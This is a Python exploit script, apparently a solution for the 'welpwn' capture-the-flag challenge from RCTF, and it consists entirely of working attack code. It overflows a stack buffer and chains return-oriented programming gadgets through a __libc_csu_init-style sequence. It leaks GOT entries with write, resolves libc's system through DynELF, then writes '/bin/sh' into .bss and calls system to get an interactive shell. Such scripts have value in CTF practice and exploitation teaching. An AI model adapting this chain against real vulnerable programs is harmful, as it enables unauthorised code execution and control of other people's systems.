# from zio import *
# from zio import *
from zio import *
from pwnlib.dynelf import *
from pwnlib.elf import *
import ctypes

target  = './welpwn_932a4428ea8d4581431502ab7e66ea4b'
io      = zio(target, print_read = False, print_write = False, timeout = 0x10000)

pop_rdi     = 0x004008a3
pop_rsi_p   = 0x004008a1
p4_ret      = 0x0040089c
plt_puts    = 0x004005a0
got_write   = 0x00601020
got_puts    = 0x00601018
adr_bss     = 0x00601000
got_read    = 0x00601038

def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0):
    payload  = l64(part1)   # part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret
    payload += l64(0x0)     # rbx be 0x0
    payload += l64(0x1)     # rbp be 0x1
    payload += l64(jmp2)    # r12 jump to
    payload += l64(arg3)    # r13 -> rdx    arg3
    payload += l64(arg2)    # r14 -> rsi    arg2
    payload += l64(arg1)    # r15 -> edi    arg1
    payload += l64(part2)   # part2 entry will call [rbx + r12 + 0x8]
    payload += 'A' * 56     # junk
    return payload

def leak(address):
    payload  = 'A' * 24
    payload += l64(p4_ret)
    payload += com_gadget(0x40089a, 0x400880, jmp2 = got_write,
            arg1 = 0x1, 
            arg2 = address, 
            arg3 = 0x20) 
    payload += l64(0x400630) # program entry
    io.wl(payload)
    leak_data = io.rtl('A' * 24 + l64(p4_ret)[:3]).replace('Welcome to RCTF\n', '').replace('A' * 24 + l64(p4_ret)[:3], '')
    print '[-] {}\t==>\t{}'.format(hex(ctypes.c_uint64(address).value), leak_data.encode('hex'))
    return leak_data

def exp(adr_system):
    raw_input()
    payload  = 'A' * 24
    payload += l64(p4_ret)
    payload += com_gadget(0x40089a, 0x400880, jmp2 = got_read,
            arg1 = 0x0, 
            arg2 = adr_bss + 0x80, 
            arg3 = 0x10)
    payload += com_gadget(0x40089a, 0x400880, jmp2 = adr_bss + 0x88,
            arg1 = adr_bss + 0x80)
    payload += l64(0xdeadbeef)
    io.wl(payload)
    io.wl('/bin/sh\x00' + l64(adr_system))

d = DynELF(leak, elf = ELF('welpwn_932a4428ea8d4581431502ab7e66ea4b'))

adr_system = d.lookup('system', 'libc')
print '[+] system addr\t:\t' + hex(adr_system)
exp(adr_system)
io.itr()
